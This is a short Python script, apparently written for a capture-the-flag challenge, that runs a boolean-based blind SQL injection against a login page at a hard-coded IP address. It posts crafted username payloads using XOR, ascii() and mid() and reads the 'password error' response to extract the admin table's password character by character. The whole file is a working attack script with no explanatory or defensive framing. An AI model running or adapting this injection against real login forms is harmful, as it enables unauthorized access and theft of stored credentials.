# coding:utf-8

#payload :admin'^(ascii(mid(database()from(1)))<>97)^0#
import requests, re

url = 'http://123.206.31.85:49167/index.php'
#database = blindsql

def get_data(index):
    for i in range(1,123):
        #payload = "admin'^(ascii(mid(database()from({0})))<>{1})^0#".format(index, str(i))
        payload = "admin'^(ascii(mid((select(password)from(admin))from({0})))<>{1})^0#".format(index,str(i))
        #payload = "admin'^(ascii(mid(database()from(1)))<>98)^0#"
        #print(payload)
        post_data = {'username':payload, 'password':'123'}
        html = requests.post(url, data=post_data).text
        if (re.compile('password error').findall(html)) != []:
            print(chr(i),end='')
        
    
    #post_data = {'username':}
for i in range(0,100):
    get_data(i)